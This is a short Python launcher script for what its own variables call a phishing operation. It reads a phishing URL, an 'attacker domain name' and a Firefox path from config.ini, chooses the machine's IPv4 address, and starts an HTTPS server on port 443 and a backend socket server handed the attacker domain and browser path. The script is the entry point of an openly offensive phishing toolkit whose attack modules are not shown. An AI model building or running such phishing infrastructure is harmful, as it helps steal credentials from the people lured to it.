import sys
from netifaces import interfaces, ifaddresses, AF_INET
import os
from client import https_server
from backend import socket_server

phishing_url = ""
attacker_dom = ""
firefox_path = ""
try:
	with open("config.ini") as url_file:
		config = url_file.read().split("\n")
		print("Read Phishing URL:", config[0])
		print("Read Attacker Domain Name:", config[1])
		print("Read Firefox Path:", config[2])
		phishing_url = config[0]
		attacker_dom = config[1]
		firefox_path = config[2]
except:
	print("Cannot open config.ini. Did you run confingure.py?")

def ip4_addresses():
	ip_list = []
	for interface in interfaces():
		try:
			for link in ifaddresses(interface)[AF_INET]:
				ip_list.append(link['addr'])
		except: pass
	return ip_list

host = ""
if len(sys.argv) == 1:
	addrs = ip4_addresses()
	if len(addrs) > 1:
		print("Multiple ipv4 addresses found. Which one is portforwarding on port 80?")
		for i in range(len(addrs)):
			print(str(i) + ": " + addrs[i])
		i = input("Select IP by index:")
		host = addrs[int(i)]
	else:
		host = addrs[0]
else:
	host = sys.argv[1]

print("Localhost is", host)
print("Starting https server on port 443...")
https_server.startServer(host)
print("Starting backend server...")
socket_server.startServer(host, attacker_dom, firefox_path)


